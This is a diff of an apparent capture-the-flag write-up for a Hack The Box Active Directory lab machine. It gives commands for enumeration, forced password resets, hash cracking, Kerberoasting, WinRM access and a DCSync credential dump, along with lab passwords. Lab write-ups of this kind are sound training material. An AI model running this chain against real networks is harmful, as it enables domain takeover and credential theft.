@@ -16,25 +16,22 @@ ichliebedich**
 
 **RUN: nmap -sV -Pn 10.10.11.42**
 
-![](images/media/image1.png){width="6.2972222222222225in"
-height="2.2604166666666665in"}
+![](images/media/image1.png)
 
-**[MORE COMPREHENSIVE Nmap scan]{.mark} (Port 5985 = WinRM remote
+**MORE COMPREHENSIVE Nmap scan (Port 5985 = WinRM remote
 login)**
 
 **RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
 administrator.htb**
 
-![](images/media/image2.png){width="4.666666666666667in"
-height="3.941038932633421in"}
+![](images/media/image2.png)
 
 **3**. **crackmapexec** (Gathers info about **HOSTS, SERVICES, SHARES**)
 
 **RUN: crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich"
 --rid-brute \| grep SidTypeUser**
 
-![](images/media/image3.png){width="6.2972222222222225in"
-height="1.2083333333333333in"}
+![](images/media/image3.png)
 
 **4**. **bloodhound** (**Downloading** **USERS, GROUPS, COMPUTERS,
 DOMAINS, GPOs, ACLs** in **JSON-files**)
@@ -42,8 +39,7 @@ DOMAINS, GPOs, ACLs** in **JSON-files**)
 **RUN: bloodhound-python -u Olivia -p 'ichliebedich' -c All -d
 administrator.htb -ns 10.10.11.42**
 
-![](images/media/image4.png){width="7.078488626421697in"
-height="1.5260422134733158in"}
+![](images/media/image4.png)
 
 **5**. ADD **dc.administrator.htb** (found in STEP 3) to **/etc/hosts
 file**
@@ -52,13 +48,11 @@ file**
 
 \- Press **Y** to CONFIRM (exits the hosts file)
 
-![](images/media/image5.png){width="3.2760411198600177in"
-height="2.6195067804024497in"}
+![](images/media/image5.png)
 
 **6**. **RUN: sudo neo4j console** and **START Bloodhound APP**
 
-![](images/media/image6.png){width="3.5625in"
-height="2.728448162729659in"}
+![](images/media/image6.png)
 
 \- Login with **USER:** **neo4j** and **PASSWORD:** **as163452 (Both
 preconfigured, see STEPS in CERTIFIED MACHINE)**
@@ -71,15 +65,13 @@ Michael account
 
 **INFO:** Olivia can force Michael to change his password
 
-![](images/media/image7.png){width="5.822685914260718in"
-height="4.854166666666667in"}
+![](images/media/image7.png)
 
 **8**. Check **OUTBOUND OBJECT CONTROL** of
 **Michael@Administrator.htb**, he has **ForceChangePassword** to
 Benjamin account
 
-![](images/media/image8.png){width="5.828124453193351in"
-height="3.7695133420822398in"}
+![](images/media/image8.png)
 
 **[USER - FOOTHOLD]{.underline}**
 
@@ -90,8 +82,7 @@ account** (Olivia has GenericALL (FULL ACCESS) to Michael\'s account!!)
 \"Administrator.htb\" \--host \"10.10.11.42\" set password \"Michael\"
 \"12345678\"**
 
-![](images/media/image9.png){width="4.125in"
-height="0.45398622047244097in"}
+![](images/media/image9.png)
 
 **2**. Use Michael\'s account, to **change PASSWORD** of **Benjamin
 account**
@@ -100,8 +91,7 @@ account**
 \"Administrator.htb\" \--host \"10.10.11.42\" set password \"Benjamin\"
 \"12345678\"**
 
-![](images/media/image10.png){width="6.2972222222222225in"
-height="0.47430555555555554in"}
+![](images/media/image10.png)
 
 **3**. Use Benjamin\'s account, to **LOGIN via FTP**
 
@@ -119,14 +109,12 @@ height="0.47430555555555554in"}
 
 **RUN:** **get Backup.psafe3**
 
-![](images/media/image11.png){width="6.2972222222222225in"
-height="2.1618055555555555in"}
+![](images/media/image11.png)
 
 **INFO:** psafe3 files are PASSWORD-SAFE FILES. Cannot be cracked
 directly!
 
-![](images/media/image12.png){width="3.286457786526684in"
-height="1.8186417322834645in"}
+![](images/media/image12.png)
 
 **HASH can be read with** **TOOL:** **PWsafe2John**
 
@@ -135,54 +123,45 @@ height="1.8186417322834645in"}
 
 **RUN:** **pwsafe2john Backup.psafe3**
 
-![](images/media/image13.png){width="6.3597222222222225in"
-height="0.3701388888888889in"}
+![](images/media/image13.png)
 
 **4.1** Create a TEXT file and **paste HASH code in file. Name the file
 hash.txt.**
 
-![](images/media/image14.png){width="6.2868055555555555in"
-height="0.8958333333333334in"}
+![](images/media/image14.png)
 
 **4.2** **Cracked PW** with john. **PASSWORD: tekieromucho**
 
 **RUN:** **john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt**
 
-![](images/media/image15.png){width="4.71875in"
-height="1.0354166666666667in"}
+![](images/media/image15.png)
 
 **5**. Install TOOL: Passwordsafe.
 
-![](images/media/image16.png){width="2.2916666666666665in"
-height="0.31843175853018374in"}
+![](images/media/image16.png)
 
 **5.2** Open Backup.psafe3, use **PASSWORD: tekieromucho**
 
-![](images/media/image17.png){width="3.0260411198600177in"
-height="1.929818460192476in"}
+![](images/media/image17.png)
 
 Paste PASSWORD tekieromucho
 
-![](images/media/image18.png){width="3.0256944444444445in"
-height="1.8873151793525809in"}
+![](images/media/image18.png)
 
 **5.4** Copy ALL Usernames and Passwords of ALL USERS
 
-![](images/media/image19.png){width="2.6354166666666665in"
-height="2.044569116360455in"}
+![](images/media/image19.png)
 
 **5.5** Create file to **note ALL Usernames** and **Passwords**
 
-![](images/media/image20.png){width="6.291666666666667in"
-height="3.682638888888889in"}
+![](images/media/image20.png)
 
 **5.6** **Look for the rights of all 3 users** in Bloodhound or Try &
 Error PASSWORDS by manually testing it
 
 **INFO:** Found Emily has CanPSRemote right.
 
-![](images/media/image21.png){width="5.432291119860017in"
-height="2.8802602799650043in"}
+![](images/media/image21.png)
 
 **6**. Login remotely and get USER.TXT. Paste Emily\'s Password from
 STEP 5.5
@@ -190,12 +169,10 @@ STEP 5.5
 **RUN:** **evil-winrm -i 10.10.11.42 -u emily -p
 UXLCI5iETUsIBoFVTj8yQFKoHjXmb**
 
-![](images/media/image22.png){width="6.291666666666667in"
-height="2.515972222222222in"}
+![](images/media/image22.png)
 
-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--
 
-**[PRIVILEGE ESCALATION]{.underline}**
+**PRIVILEGE ESCALATION**
 
 **7**. Check Bloodhound. Emily has GenericWrite (Write Access) to
 Ehan\'s account
@@ -219,15 +196,11 @@ it attempts to set one ( abusing write access to the attribute ),
 prints the \"kerberoast\" hash, and deletes the temporary SPN that was
 set for the operation.
 
-![](images/media/image23.png){width="6.2868055555555555in"
-height="3.1305555555555555in"}
+![](images/media/image23.png)
 
 **SPN (Service Principal Name)** examples:
 
-![](images/media/image24.png){width="3.5468744531933507in"
-height="2.2404811898512684in"}![](images/media/image25.png){width="2.7031244531933507in"
-height="2.1866469816272964in"}![](images/media/image26.jpeg){width="2.3058989501312337in"
-height="2.8177088801399823in"}
+![](images/media/image24.png)![](images/media/image25.png)![](images/media/image26.jpeg)
 
 **7.1** **Download targetedKerberoast.py** FILE + **sync time** +
 **Displays HASH** of Ethan\'s account
@@ -250,15 +223,13 @@ height="2.7083333333333335in"}
 
 **Put Ehan's HASH into the hash.txt file!**
 
-![](images/media/image28.png){width="6.2972222222222225in"
-height="2.3645833333333335in"}
+![](images/media/image28.png)
 
 **8**. Look for Ethans account: **DCSync relation found**
 
 **INFO:**
 
-![](images/media/image29.png){width="4.041666666666667in"
-height="1.1745811461067366in"}
+![](images/media/image29.png)
 
 From here: DCSync(bloodhoundenterprise.io)
 
@@ -284,8 +255,7 @@ the hash of all domain users through Dcsync or from the NTDS.dit file.
 Its biggest advantage is that it supports connecting to the domain
 controller from computers outside the domain.
 
-![](images/media/image30.png){width="6.2972222222222225in"
-height="3.526388888888889in"}
+![](images/media/image30.png)
 
 **8.1** Use cracked **limpbizkit** Password
 
@@ -295,8 +265,7 @@ lateral movement or gain further access within a network**
 **RUN:** **impacket-secretsdump
 \"Administrator.htb/ethan:limpbizkit\"@\"dc.Administrator.htb\"**
 
-![](images/media/image31.png){width="4.666666666666667in"
-height="3.7902515310586176in"}
+![](images/media/image31.png)
 
 **8.2** **Login remotely** with **CREDENTIALS from STEP 8.1** (**USER +
 PASSWORD**)
@@ -308,5 +277,4 @@ PASSWORD**)
 
 **RUN:** **cd ../desktop**
 
-![](images/media/image32.png){width="6.2972222222222225in"
-height="1.4326388888888888in"}
+![](images/media/image32.png)
